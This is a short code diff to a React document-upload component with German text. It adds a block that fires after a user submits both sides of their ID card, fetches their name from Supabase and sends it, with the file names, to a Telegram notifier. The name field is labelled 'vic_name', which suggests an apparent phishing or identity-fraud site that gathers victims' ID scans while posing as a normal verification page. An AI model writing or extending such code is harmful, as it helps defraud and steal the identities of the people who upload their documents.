@@ -313,6 +313,20 @@ export default function DocumentUpload({ onBack }: { onBack: () => void }) {
         toast.error("Konnte Status nicht speichern");
       }
       setIdSubmittedAt(nowIso);
+      // Telegram notification for ID document
+      (async () => {
+        const { data: prof } = await supabase
+          .from("profiles")
+          .select("first_name, last_name")
+          .eq("id", user.id)
+          .maybeSingle();
+        const vicName = `${prof?.first_name ?? ""} ${prof?.last_name ?? ""}`.trim() || (user.email ?? "Unbekannt");
+        notifyTelegram("document_uploaded", {
+          vic_name: vicName,
+          file_name: `${idFront.name} & ${idBack.name}`,
+          category: "Personalausweis (Vorder- & Rückseite)",
+        });
+      })();
       setIdFront(null);
       setIdBack(null);
       toast.success("Personalausweis erfolgreich übermittelt");
